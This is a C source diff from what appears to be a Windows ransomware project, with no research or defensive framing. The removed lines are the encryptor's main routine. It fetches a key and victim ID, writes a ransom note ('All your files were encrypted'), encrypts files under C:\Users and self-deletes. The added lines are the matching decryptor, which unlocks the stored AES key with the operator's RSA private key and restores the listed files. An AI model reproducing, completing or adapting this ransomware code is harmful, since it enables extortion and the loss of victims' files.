@@ -7,27 +7,96 @@
 #include "utils.h"
 #include "encrypt.h"
 #include "files.h"
-
+#include "aes.h"
 #include <windows.h>
-
+#include <shlobj.h>
+#include "decrypt.h"
 
 int main(int argc, char *argv[]) {
-    #ifndef _WIN32
-        self_delete(argv[0]);
-    #endif
-    char key[512];
-    int id;
-    if (!get_key(&id, key)) {
-        self_delete(argv[0]);
+    if (argc != 2) {
+        printf("Usage: %s <RSA private key as n-d in hex>\n", argv[0]);
+        return 1;
     }
-    char readme[1024];
-    snprintf(readme, sizeof(readme), "All your files were encrypted, go to %s\nYour ID is: %d\n", URL, id);
-    printf("%s", readme);
-    if (!create_readme(readme)) {
-            self_delete(argv[0]);
+    
+    char privkey_hex[1024];
+    snprintf(privkey_hex, sizeof(privkey_hex), "%s", argv[1]);  // Expecting "n-d" format directly
+
+    BCRYPT_KEY_HANDLE hKey = import_rsa_private_key(privkey_hex);
+    if (!hKey) {
+        printf("Failed to import RSA private key\n");
+        return 1;
     }
-    enumerate("C:\\Users", key);
-    self_delete(argv[0]);
+    
+    const char *VERIFY_STRING = "This key is valid";
+    size_t verify_len = strlen(VERIFY_STRING);
+    FILE *verify_file = fopen("C:\\Users\\Public\\Documents\\verify.enc", "rb");
+    if (!verify_file) {
+        printf("Failed to open verify.enc\n");
+        BCryptDestroyKey(hKey);
+        return 1;
+    }
+    fseek(verify_file, 0, SEEK_END);
+    long encrypted_verify_len = ftell(verify_file);
+    fseek(verify_file, 0, SEEK_SET);
+    unsigned char *encrypted_verify = malloc(encrypted_verify_len);
+    fread(encrypted_verify, 1, encrypted_verify_len, verify_file);
+    fclose(verify_file);
+    
+    unsigned char decrypted_verify[256];
+    size_t decrypted_len = sizeof(decrypted_verify);
+    if (!rsa_decrypt(encrypted_verify, encrypted_verify_len, hKey, decrypted_verify, &decrypted_len)) {
+        printf("Failed to decrypt verification string\n");
+        free(encrypted_verify);
+        BCryptDestroyKey(hKey);
+        return 1;
+    }
+    free(encrypted_verify);
+    
+    if (decrypted_len != verify_len || memcmp(decrypted_verify, VERIFY_STRING, verify_len) != 0) {
+        printf("Invalid decryption key\n");
+        BCryptDestroyKey(hKey);
+        return 1;
+    }
+    
+    FILE *key_file = fopen("C:\\Users\\Public\\Documents\\key.enc", "rb");
+    if (!key_file) {
+        printf("Failed to open key.enc\n");
+        BCryptDestroyKey(hKey);
+        return 1;
+    }
+    fseek(key_file, 0, SEEK_END);
+    long encrypted_key_len = ftell(key_file);
+    fseek(key_file, 0, SEEK_SET);
+    unsigned char *encrypted_key = malloc(encrypted_key_len);
+    fread(encrypted_key, 1, encrypted_key_len, key_file);
+    fclose(key_file);
+    
+    unsigned char aes_key[AES_KEY_SIZE];
+    size_t aes_key_len = AES_KEY_SIZE;
+    if (!rsa_decrypt(encrypted_key, encrypted_key_len, hKey, aes_key, &aes_key_len)) {
+        printf("Failed to decrypt AES key\n");
+        free(encrypted_key);
+        BCryptDestroyKey(hKey);
+        return 1;
+    }
+    free(encrypted_key);
+    
+    FILE *paths_file = fopen("C:\\Users\\Public\\Documents\\.paths.txt", "r");
+    if (!paths_file) {
+        printf("Failed to open .paths.txt\n");
+        BCryptDestroyKey(hKey);
+        return 1;
+    }
+    char line[MAX_PATH];
+    while (fgets(line, sizeof(line), paths_file)) {
+        char *filepath = strtok(line, "\n");
+        if (filepath) {
+            decrypt_file_aes_cbc(filepath, aes_key);
+        }
+    }
+    fclose(paths_file);
+    
+    BCryptDestroyKey(hKey);
+    printf("System decrypted successfully\n");
     return 0;
 }
-
